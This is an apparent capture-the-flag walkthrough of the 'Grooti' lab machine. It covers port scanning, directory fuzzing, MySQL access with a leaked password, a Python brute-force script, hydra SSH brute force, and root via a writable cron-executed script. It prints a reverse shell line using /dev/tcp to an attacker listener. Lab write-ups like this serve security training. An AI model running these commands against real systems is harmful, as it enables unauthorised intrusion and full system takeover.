# IP 
172.17.0.2
# Reconnaissance
```sh
ping -c 2 172.17.0.2
```

```sh
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.097 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.041 ms

--- 172.17.0.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1030ms
rtt min/avg/max/mdev = 0.041/0.069/0.097/0.028 ms
```

Device is discoverable
Probably a linux OS (ttl = 64)
# Ports scanning
```sh
sudo nmap -p- -sS -sV -sC -T4 -n --min-rate 5000 172.17.0.2
```

```
Nmap scan report for 172.17.0.2
Host is up (0.0000030s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 46:69:49:1a:d0:b7:26:05:90:a3:22:b2:a8:fe:fd:83 (ECDSA)
|_  256 91:67:c5:15:53:13:af:6f:28:7d:1e:77:46:0c:c1:bb (ED25519)
80/tcp   open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: \xF0\x9F\x8C\xB1 Grooti's Web
|_http-server-header: Apache/2.4.58 (Ubuntu)
3306/tcp open  mysql   MySQL 8.0.42-0ubuntu0.24.04.2
| ssl-cert: Subject: commonName=MySQL_Server_8.0.42_Auto_Generated_Server_Certificate
| Not valid before: 2025-07-18T22:37:08
|_Not valid after:  2035-07-16T22:37:08
|_ssl-date: TLS randomness does not represent time
| mysql-info:
|   Protocol: 10
|   Version: 8.0.42-0ubuntu0.24.04.2
|   Thread ID: 11
|   Capabilities flags: 65535
|   Some Capabilities: LongPassword, SupportsCompression, InteractiveClient, LongColumnFlag, ConnectWithDatabase, Speaks41ProtocolOld, FoundRows, ODBCClient, Support41Auth, SupportsTransactions, SupportsLoadDataLocal, IgnoreSigpipes, DontAllowDatabaseTableColumn, SwitchToSSLAfterHandshake, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: /qQrMw}n\x03^?<\x15wU\x08HgX)
|_  Auth Plugin Name: caching_sha2_password
MAC Address: 12:8E:74:3F:01:F1 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.17 seconds
```

Discovered 3 open ports
- Port 22: running SSH
- Port 80: running a web page with Apache
- Port 3306: running a SQL database (MySQL)
# Web enumeration
![[Pasted image 20260916144134.png]]
## Dir Fuzzing
```sh
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt -x php,html,conf,sh,txt,sql,zip,md
```

```sh
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              conf,sh,txt,sql,zip,md,php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta.sh              (Status: 403) [Size: 275]
.hta.txt             (Status: 403) [Size: 275]
.hta                 (Status: 403) [Size: 275]
.hta.conf            (Status: 403) [Size: 275]
.hta.zip             (Status: 403) [Size: 275]
.hta.sql             (Status: 403) [Size: 275]
.hta.md              (Status: 403) [Size: 275]
.htaccess            (Status: 403) [Size: 275]
.htaccess.sql        (Status: 403) [Size: 275]
.htaccess.zip        (Status: 403) [Size: 275]
.hta.html            (Status: 403) [Size: 275]
.htaccess.php        (Status: 403) [Size: 275]
.htaccess.md         (Status: 403) [Size: 275]
.hta.php             (Status: 403) [Size: 275]
.htaccess.html       (Status: 403) [Size: 275]
.htaccess.conf       (Status: 403) [Size: 275]
.htaccess.sh         (Status: 403) [Size: 275]
.htpasswd            (Status: 403) [Size: 275]
.htpasswd.md         (Status: 403) [Size: 275]
.htpasswd.zip        (Status: 403) [Size: 275]
.htpasswd.sql        (Status: 403) [Size: 275]
.htpasswd.txt        (Status: 403) [Size: 275]
.htaccess.txt        (Status: 403) [Size: 275]
.htpasswd.php        (Status: 403) [Size: 275]
.htpasswd.sh         (Status: 403) [Size: 275]
.htpasswd.html       (Status: 403) [Size: 275]
.htpasswd.conf       (Status: 403) [Size: 275]
archives             (Status: 301) [Size: 311] [--> http://172.17.0.2/archives/]
imagenes             (Status: 301) [Size: 311] [--> http://172.17.0.2/imagenes/]
index.html           (Status: 200) [Size: 1436]
index.html           (Status: 200) [Size: 1436]
secret               (Status: 301) [Size: 309] [--> http://172.17.0.2/secret/]
server-status        (Status: 403) [Size: 275]
Progress: 41517 / 41517 (100.00%)
===============================================================
Finished
===============================================================
```

There are some interesting directories to explore
### secret page
![[Pasted image 20260916144427.png]]

This page hints us the escalation path we'll need to follow later: rocker -> groot -> naia

To download the file
```sh
wget http://172.17.0.2/secret/instrucciones.txt
```

```sh
--2026-09-16 14:45:31--  http://172.17.0.2/secret/instrucciones.txt
Connecting to 172.17.0.2:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 571 [text/plain]
Saving to: ‘instrucciones.txt.1’

instrucciones.txt.1              100%[=======================================================>]     571  --.-KB/s    in 0s

2026-09-16 14:45:31 (306 MB/s) - ‘instrucciones.txt.1’ saved [571/571]
```

At the end of the file we see something interesting

```sh
tail -n 2 instrucciones.txt
```

```
mysql -u rocket -p -h 172.17.0.2 --ssl=0
```
### images page
![[Pasted image 20260916145009.png]]

```sh
curl -s http://172.17.0.2/imagenes/README.txt
(password1) Encuentra donde ponerla ;)
```

```sh
wget http://172.17.0.2/imagenes/grooti.jpg
--2026-09-16 14:51:20--  http://172.17.0.2/imagenes/grooti.jpg
Connecting to 172.17.0.2:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 105820 (103K) [image/jpeg]
Saving to: ‘grooti.jpg’

grooti.jpg                       100%[=======================================================>] 103.34K  --.-KB/s    in 0s

2026-09-16 14:51:20 (1.20 GB/s) - ‘grooti.jpg’ saved [105820/105820]
```

### archives
![[Pasted image 20260916145213.png]]
# MySQL enum
```sh
 mysql -u rocket -p -h 172.17.0.2 --ssl=0
Enter password:password1
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 19
Server version: 8.0.42-0ubuntu0.24.04.2 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]>
```

Got access with the password leaked in the web page

```sh
MySQL [files_secret]> source script.sql
+--------------------+
| Database           |
+--------------------+
| files_secret       |
| information_schema |
| performance_schema |
+--------------------+
3 rows in set (0.001 sec)
```

```MySQL
SHOW DATABASES
```

``` sh
MySQL [files_secret]> source script.sql
+------------------------+
| Tables_in_files_secret |
+------------------------+
| rutas                  |
+------------------------+
1 row in set (0.001 sec)
```

```MySQL
SHOW TABLES
```

```sh
MySQL [files_secret]> source script.sql
+--------+--------------+------+-----+---------+----------------+
| Field  | Type         | Null | Key | Default | Extra          |
+--------+--------------+------+-----+---------+----------------+
| id     | int          | NO   | PRI | NULL    | auto_increment |
| nombre | varchar(50)  | YES  |     | NULL    |                |
| ruta   | varchar(255) | YES  |     | NULL    |                |
+--------+--------------+------+-----+---------+----------------+
3 rows in set (0.001 sec)
```

```MySQL
DESCRIBE rutas
```

```sh
MySQL [files_secret]> source script.sql
+------------+---------------------------------+
| nombre     | ruta                            |
+------------+---------------------------------+
| imagenes   | /var/www/html/files/imagenes/   |
| documentos | /var/www/html/files/documentos/ |
| facturas   | /var/www/html/files/facturas/   |
| secret     | /unprivate/secret               |
+------------+---------------------------------+
4 rows in set (0.000 sec)
```

```MySQL
SELECT nombre, ruta FROM rutas
```
# Secret login
![[Pasted image 20260916152320.png]]

If message is not necessary for login, we could brute force trying all numbers from 1 to 100
```python
import requests
import time

url = "http://172.17.0.2/unprivate/secret/generate.php"
content = "test"
expected_len = len(content)

total_peticiones = 100
intervalo_segundos = 0.1

print(f"Iniciando {total_peticiones} peticiones POST hacia {url}...")
print(f"content={content!r}  (longitud normal esperada = {expected_len})\n")

for i in range(1, total_peticiones + 1):
    try:
        r = requests.post(
            url,
            data={"content": content, "number": i},
            timeout=10,
        )

        n = len(r.text)
        if n != expected_len:
            print(f"[{i:>3}/{total_peticiones}] status={r.status_code} len={n}  <-- DISTINTO")
            print(f"        contenido: {r.text!r}\n")
			open("password.zip", "wb").write(r.content)	
        else:
            print(f"[{i:>3}/{total_peticiones}] status={r.status_code} len={n}")

    except requests.exceptions.RequestException as e:
        print(f"[{i:>3}/{total_peticiones}] Error: {e}")

    if i < total_peticiones:
        time.sleep(intervalo_segundos)

print("\nProceso finalizado.")
```

```sh
python3 brute-force.py
```

```sh
password.zip
Archive:  password.zip
[password.zip] password16.txt password: password1
  inflating: password16.txt
```

```sh
cat password16.txt

admin123
123456
qwerty
letmein
roottoor
12345678
password
summer2025
iloveyou
hunter2
passw0rd
toor123
changeme
adminadmin
welcome1
trustno1
abc123456
useruser
dragon2024
mydogrex
grootlove
Galaxy42
!P@ssword!
megasecret
YOLOgroot
P@ss1234
monkeybanana
YOgrootRULEZ
YoSoYgRoOt
finalchance
1qaz2wsx
batman2025
rootroot
hello123
```

This file probably contains groot's password
(This phase is also reachable using *Intruder* in Burpsuite instead of running the python script)
# Brute force SSH
```sh
hydra -l grooti -P password16.txt ssh://172.17.0.2
```

``` sh
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-09-16 18:17:17
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 34 login tries (l:1/p:34), ~3 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: grooti   password: YoSoYgRoOt
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-09-16 18:17:26
```
# SSH login
```sh
ssh grooti@172.17.0.2
grooti@172.17.0.2's password: YoSoYgRoOt
```
# Privilege escalation
```sh
crontab -l

* * * * * /opt/cleanup.sh
```

```sh
cat /opt/cleanup.sh

#!/bin/bash

bash /tmp/malicious.sh
```

```sh
ls -l /tmp | grep malicious.sh
-rwxrw-r-- 1 root  grooti   28 Sep 16 23:37 malicious.sh
```

```sh
echo 'whoami > /tmp/test.txt' > /tmp/malicious.sh
```

```
cat /tmp/test.txt
root
```

This is our escalation point
We have privileges to modify and wait for it to be executed
# Reverse shell
```sh
sudo nc -lvnp 443
```

```sh
 echo 'sh -i >& /dev/tcp/172.17.0.1/443 0>&1' > /tmp/malicious.sh
```

``` sh
whoami
root
```

```sh
cd /root
ls -l
total 4
-rw-r--r-- 1 root root 1005 Jul 22  2025 grooti.txt
```
`
```sh
cat grooti.txt

⠰⣶⣶⣶⣄⠀⠀⠀⢀⣀⠀⠀⣠⣄⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠻⣿⣿⣿⡀⠀⠀⣿⠿⠷⢾⡏⠉⣿⣄⢀⣿⣷⡆⠀⠀
⢀⣠⣬⡁⢸⣿⣶⣿⣿⡇⠀⣾⡇⠀⣿⡏⠛⢻⣿⢧⣤⠀
⢸⣿⡿⡿⢻⠇⠀⢿⣿⡇⣠⣿⡇⣼⡿⠀⠀⣼⡏⢠⣾⠀
⢸⣿⡀⢀⣿⠀⣴⠈⣿⣿⣿⣿⣿⣿⠃⣾⣤⣿⠀⣼⣿⠀
⢸⣿⣧⢸⣿⣧⣿⣇⣿⣿⣿⣿⣿⣿⣾⣿⣿⣏⣼⣿⣿⠀
⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄
⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁
⠀⢹⣿⣿⣿⣿⣿⠉⠙⣿⣿⣿⣿⣿⡯⠉⢻⣿⣿⣿⣿⠀
⠀⠸⣿⣿⣿⣧⡀⠀⣠⣿⣿⣿⣿⣄⠀⢀⣼⣿⣿⣿⠇⠀
⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀
⠀⠀⠘⣿⣿⣿⣿⣿⡿⠿⠿⢿⣿⣿⣿⣿⣿⣿⡟⠁⠀⠀
⠀⠀⠀⠘⣿⣿⣿⣿⣷⣄⣀⣀⣠⣿⣿⣿⣿⠏⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⠿⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀
```